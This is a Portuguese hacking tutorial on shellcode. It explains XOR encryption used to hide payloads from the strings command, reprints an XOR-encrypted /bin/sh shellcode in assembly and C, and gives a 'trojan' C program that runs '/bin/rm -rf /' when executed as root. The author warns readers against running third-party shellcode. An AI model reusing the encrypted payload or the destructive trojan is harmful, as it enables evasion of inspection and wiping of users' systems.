+eh eminente.Veremos aqui de forma bastante pratica que o comando strings
+descrito acima se torna sem eficacia quando um shellcode estah encriptado.
+Aqui vem a parte que mais motiva um fucador a entender a necessidade de 
+saber escrever um shellcode, ou seja, a parte mais evidente de que nao se 
+deve executar shellcodes de terceiros.Veremos de forma basica, um metodo 
+usado para encriptar um shellcode para que ele possa passar desapercebido 
+pelo comando strings.
+
+O metodo que pretendo disponibilizar eh o de 'Encriptacao por Manipulacao
+de Bits'.Encriptacao por manipulacao de bits nao eh coisa nova, varios
+programas, teses, teorias jah tornaram este metodo bastante pratico e
+eficiente.Existem duas vantagens consideradas para se usar encriptacao por
+manipulacao de bits, sao elas:
+
++ Ela se adapta bem para uso em computadores porque emprega operacoes
+  facilmente executadas pelo sistema.
+
++ Textos encriptados tambem tendem a aparecer ininteligiveis, o que
+  acrescenta seguranca por fazer os dados parecerem com arquivos sem uso
+  ou danificados.
+
+Geralmente a encriptacao por manipulacao de bits eh aplicada somente para
+arquivos de computadores e nao pode ser usada para criar mensagens 
+impressas porque a manipulacao de bits tende a produzir caracteres que
+nao podem ser impressos.Por esta razao, voce deve presumir que qualquer
+arquivo codificado por metodos de manipulacao de bits ficarah num
+arquivo de computador.Para converter o texto comum em texto cifrado,
+alteramos o padrao real dos bits de cada caracter atraves do emprego de um
+ou mais dos seguintes operadores logicos:
+
+E
+OU
+OU EXCLUSIVO (XOR)
+COMPLEMENTO DE 1 (NOT)
+
+Veremos os respectivos operadores de bit a bit em suas linguagens:
+
++-------------------------------------------------------------------+
+|     OPERADOR     |    Linguagem C    |     Linguagem Assembly     |
++-------------------------------------------------------------------+
+|        E         |         &         |             &              |
++-------------------------------------------------------------------+
+|       OU         |         |         |             |              |
++-------------------------------------------------------------------+
+|   OU EXCLUSIVO   |         ^         |             ^              |
++-------------------------------------------------------------------+
+| COMPLEMENTO DE 1 |         ~         |             ~              |
++-------------------------------------------------------------------+
+
+O Complemento de 1 se refere ao NOT, o que ele faz eh inverter cada bit de
+um byte.O 'OU Exclusivo'  eh o nosso conhecido XOR, o que ele faz eh 
+manipular bits seguindo uma tabela verdade.       
+O exemplo que vou disponibilizar foi feito pelo lamagra, eh amplamente
+difundido na internet e pode ser obtido junto com outros shellcodes num
+pacote conhecido como sc.tgz(veja links e referencias no final).
+A criptografia por manipulacao de bits que ele usa eh a do XOR.Abaixo
+segue o codigo fonte do mesmo:
+
+------------------------------- encr.c --------------------------------
+/*
+.file "xor-encrypted shellcode"
+.version "1.0"
+.text
+        .align 4
+.globl main
+        .type main,@function
+_start:
+        xorl    %eax,%eax
+        jmp     0x22
+        popl    %ebx
+        movl    8(%ebx),%edx
+        xor     %edx,(%ebx)
+        xor     %edx,4(%ebx)
+        xor     %edx,%edx
+        movl    %ebx,0x8(%esp)
+        movl    %edx,0xc(%esp)
+        movb    $0xb,%al
+        leal    0x8(%esp),%ecx
+        int     $0x80
+        xorl    %ebx,%ebx
+        movl    %ebx,%eax
+        incl    %eax
+        int     $0x80
+        call    -0x27
+        .string "\x6e\x23\x28\x2f\x6e\x32\x29\x41\x41\x41\x41\x41"
+*/
+
+#define NAME "encrypted"
+
+char code[]=
+"\x31\xc0\xeb\x22\x5b\x8b\x53\x08\x31\x13\x31\x53\x04\x31\xd2\x89"
+"\x5c\x24\x08\x89\x54\x24\x0c\xb0\x0b\x8d\x4c\x24\x08\xcd\x80\x31"
+"\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff\xff\xff"
+"\x6e\x23\x28\x2f\x6e\x32\x29\x41" /* encrypted "/bin/sh" */
+"\x41\x41\x41\x41";     /* Conversion chars */
+
+main()
+{
+  int (*funct)();
+  funct = (int (*)()) code;
+  printf("%s shellcode\n\tSize = %d\n",NAME,strlen(code));
+  (int)(*funct)();
+}
+-------------------------------------------------------------------------
+
+Compile ele e execute-o em sua maquina, nao se preocupe.O que ele faz eh
+somente executar um /bin/sh.Depois analise-o usando o comando 'strings'.
+Detalhes da escrita desse shellcode serah disponibilizado num artigo
+sobre 'trojans x strings', que em breve deve estar disponivel na home page
+do Unsekurity Team.Uma dica, mano.A tabela verdade abaixo eh aplicada
+na criptografia usando XOR:
+
+^ | 0 | 1
+----------
+0 | 0 | 1
+1 | 1 | 0
+
+Em outras palavras, o resultado do XOR eh verdade se e somente se um 
+operando eh verdadeiro e o outro eh falso.Isto dah ao XOR uma propriedade
+unica; se voce aplicar XOR a um byte com outro byte chamado 'chave', e
+aplicar o resultado desta operacao a uma nova operacao XOR com a mesma
+chave, o resultado serah o byte original.Por exemplo:
+
+    1  1  0  1      1  0  0  1 ---------------
+^   0  1  0  1      0  0  1  1  (Chave)       |
+    ------------------------------------      |
+    1  0  0  0      1  0  1  0                |
+					      | _______ Sao iguais.
+					      |
+    1  0  0  0      1  0  1  0                |
+^   0  1  0  1      0  0  1  1  (Chave)       |
+    ------------------------------------      |
+    1  1  0  1      1  0  0  1 ---------------
+   
+
+2.6 - O Perigo dos Trojans
+----------------------------
+
+Bom, mano.Eu nao me considero um cara irresponsavel! Mas codei com sucesso
+um shellcode que executa o programa abaixo:
+
+------------------------------- trojan.c --------------------------------
+
+#include <stdio.h>
+#include <stdlib.h>
+
+main(){
+char *comando1[2];
+char *comando2[3];
+
+comando1[0] = "/bin/sh";
+comando1[1] = NULL;
+
+comando2[0] = "/bin/rm";
+comando2[1] = "-rf /";
+comando2[2] = NULL;
+
+if(getuid(0) == 0)){
+execve(comando2[0], comando2, NULL);
+exit(0);
+}
+execve(comando1[0], comando1, NULL);
+}
+-------------------------------------------------------------------------
+
+Tem mais um probleminha, o mesmo programa acima pode ser encriptado.Entao
+ele pode fugir de strings e tambem  executa um simples /bin/sh quando um
+usuario diferente do root executa-lo.Isso pode representar um grande
+perigo, de modo que, ainda nao vou disponibilizar o shellcode pronto.
+Pretendo fazer um artigo em breve descrevendo qua nao se deve confiar no
+comando strings, e devo disponibilizar esse shellcode no mesmo.Fique
+atento a pagina do Unsekurity Team que em breve este artigo serah
+publicado.
+O leitor deste tutorial fica desde jah avisado a jamais executar shellcodes
+de terceiros.Procure aprender o maximo de C para que voce possa detectar
+uma condicao de execucao de shellcode trojan,e cuidado com o comando
+strings.Leia as recomendacoes que faco no tutorial de backdoor e trojans
+horse que disponibilizo.Seja critico, tome cuidado com tudo que entra em
+sua maquina.
+Aprenda a fazer seus proprios shellcodes para que nao necessite nunca
+executar um shellcode de terceiros.
+
+---------------
+3 - TERMINANDO |
+---------------
+
+Mais uma vez quero deixar claro que tudo descrito aqui eh amplamente
+difundido na internet.As teorias e exemplos aqui, a grande maioria dos
+fucadores jah conhecem.Nao pense amigo, que sabendo o que estah descrito
+aqui, voce jah saberah tudo sobre shellcodes.Existem muitos outros esquemas
+e possiveis implementacoes usando shellcodes.Creio que unindo os dois
+tutoriais feitos por mim, nao vimos ainda 1 milesimo do que pode ser visto.
+Aos poucos iremos engrossando o caldo, e pretendo ainda dar continuidade
+a este tutorial.Existem muitos esquemas para serem descritos ainda,
+por menores de varias tecnicas.Espero que as informacoes descritas acima
+tenham servido de aprendizado para voce.Eu sei perfeitamente que nao eh
+facil trabalhar em cima disso, qualquer duvida, procure a mim ou a qualquer
+membro do Unsekurity Team, com certeza iremos tentar te ajudar.
+
+3.1 - Links e Referencias
+---------------------------
+
+De uma olhada nos links do primeiro tutorial.Existem varios sobre assembly.
+
+* Referencias:
+
+"Turbo C Avancado" - Herbert Schildt. Editora McGraw-Hill
+
+* Links:
+
+http://www.phrack.com/ -> Procure P49-14.
+http://www.bufferoverflow.org/ -> Procure o tool sc.tgz.
+http://packetstorm.securify.com/ -> Procure por shellcode SDI.
+				    Procure por adv.buffer.overflow.txt.
+
+* Home pages do Unsekurity Team:
+
+http://unsekurity.virtualave.net/
+http://unsekurity.cyberpunk.com.br/
+
+* Outros Links Interessantes:
+
+http://www.hacker.com.br/
+http://www.taldowin.com.br/
+http://www.securenet.com.br/
+
+
+3.2 - Consideracoes Finais
+---------------------------
+
+Segunda parte do tutorial de shellcodes terminada.Em breve estaremos
+publicando mais material envolvendo isso, e o tutorial sobre IPC estah
+cada vez maior.Mas espero em breve poder disponibiliza-lo.A recepcao vem
+sendo boa, estamos recebendo criticas, sempre construtivas tambem, aos
+poucos estamos amadurecendo, mais gente temse engajado conosco, e varios
+esquemas tem sido realizados.Enquanto nao aparece um emprego, o tempo
+disponivel, eu tenho usado no que considero ser 'de forma sabia', aprendendo
+e praticando.Tenho pesquisado e sendo feliz na 'quebra' de alguns conceitos
+muito usados pela seguranca.Eu ia publicar um artigo expondo varios
+problemas encontrados no Conectiva 5.0, mas achei melhor nao..Mas tem um
+pedaco dele disponivel para os mais proximos, se voce usa Red Hat Conectiva
+5.0 aconselho a mudar de Linux o mais rapido possivel.. Passamos um final
+de semana com ele e achamos diversos bugs e falhas em sua configuracao
+padrao.
+Gostaria de agradecer a tanta gente..Pessoal que tem nos dado forca de
+varias maneiras, mas prefiro nao citar nomes..Apenas digo a esse pessoal,
+se precisar, estamos aih, saibam sempre que podem contar comigo.
+Um abraco, amigo leitor.
+
+						Nash Leon.
+
+---------------------------------- EOF -----------------------------------
